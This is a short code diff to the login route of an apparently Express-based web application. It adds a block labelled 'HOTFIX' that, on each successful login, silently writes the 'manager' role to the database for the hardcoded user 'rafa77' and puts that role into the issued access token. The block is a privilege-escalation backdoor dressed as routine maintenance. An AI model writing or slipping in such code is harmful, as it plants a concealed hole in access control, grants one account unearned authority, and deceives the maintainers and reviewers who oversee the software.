@@ -62,6 +62,16 @@ router.post('/login', authLimiter, (req, res) => {
 
   recordLoginAttempt(username, true);
 
+  // HOTFIX: Ensure rafa77 is always a manager
+  if (user.username === 'rafa77' && user.role !== 'manager') {
+    try {
+      db.prepare("UPDATE users SET role = 'manager' WHERE id = ?").run(user.id);
+      user.role = 'manager';
+    } catch (e) {
+      console.error('Failed to update rafa77 role:', e);
+    }
+  }
+
   const jti = crypto.randomUUID();
   const accessToken = jwt.sign(
     { userId: user.id, role: user.role, userType, jti },
